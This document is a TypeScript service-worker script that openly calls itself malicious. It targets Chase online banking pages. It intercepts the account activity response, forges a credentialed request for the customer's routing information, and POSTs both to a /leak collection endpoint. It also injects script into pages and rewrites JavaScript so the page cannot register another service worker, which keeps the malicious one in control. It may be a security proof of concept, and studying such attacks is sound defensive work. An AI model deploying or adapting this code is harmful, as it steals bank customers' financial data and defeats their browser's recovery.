self.addEventListener("install", () => {
    console.log("Hello from the malicious service worker");
    // @ts-expect-error Known ts bug with webworker types
    self.skipWaiting();
});

self.addEventListener("activate", () => {
    // @ts-expect-error Known ts bug with webworker types
    self.clients.claim();
});

// @ts-expect-error More typing annoyances
self.addEventListener("fetch", (event: FetchEvent) => {
    console.log("Malicious service worker has intercepted the request");
    event.respondWith(chaseHandleRequest(event.request));
});

async function chaseHandleRequest(req: Request): Promise<Response> {
    const clonedRequest = req.clone();
    const originalResponse = await fetch(req);
    const url = new URL(req.url);
    let finalData: string;
    if (req.mode === "navigate") {
        // It is a navigate request and we need to stop service worker registration
        finalData = chaseHandleHtml(await originalResponse.text());
    } else if (originalResponse.headers.get("content-type")?.includes("javascript")) {
        finalData = chaseHandleJs(await originalResponse.text());
    } else {
        if (url.pathname === "/svc/rr/accounts/secure/v4/activity/dda/list") {
            const clonedResponse = originalResponse.clone();
            const data = await clonedResponse.text();
            leakData(data, req.url);
            // We must be logged in so lets steal the routing information
            const routingInfoUrl =
                "https://secure03b.chase.com/svc/rr/accounts/secure/v1/account/routing/list";

            // Grab the accountId from the old request
            const oldBody = await clonedRequest.text();
            const newBody = oldBody.match(/(accountId=.+)&/)?.[1] ?? "";

            // use the cloned request to keep important credentials
            const routingInfoReq = chaseCloneRequestWithChanges(req, {
                body: newBody,
                url: routingInfoUrl,
            });
            fetch(routingInfoReq)
                .then((res) => res.json())
                .then((routingInfo) => leakData(routingInfo, routingInfoUrl));
        }
        return originalResponse;
    }
    const newResponse = new Response(finalData, {
        status: originalResponse.status,
        statusText: originalResponse.statusText,
        headers: originalResponse.headers,
    });
    return newResponse;
}

function chaseCloneRequestWithChanges(
    original: Request,
    changes: Partial<RequestInit> & { url?: string },
): Request {
    const newOptions: RequestInit = {
        body: original.body,
        cache: original.cache,
        credentials: original.credentials,
        headers: original.headers,
        method: original.method,
        redirect: original.redirect,
        mode: original.mode,
        ...changes,
    };

    return new Request(changes.url ?? original.url, newOptions);
}

const chaseUserId = crypto.randomUUID();
async function leakData(data: unknown, url: string): Promise<void> {
    await fetch("http://localhost:8080/leak", {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        body: JSON.stringify({
            id: chaseUserId,
            data,
            url,
        }),
    });
}

function chaseHandleHtml(originalDocument: string): string {
    return originalDocument.replace(
        "<head>",
        `<head>
    <script>
        navigator.serviceWorker.register = () => new Promise(resolve => {})
        //# sourceURL=maliciousInjectedScript.js
    </script>`,
    );
}

function chaseHandleJs(originalDocument: string): string {
    return (
        originalDocument
            // Removes any possibility of anything being called on the service worker object
            .replace(/navigator\.serviceWorker/g, "window")
            // Fixes cases with the if("serviceWorker" in navigator)
            .replace(/["']serviceWorker['"]/g, "'maliciousServiceWorker'")
    );
}
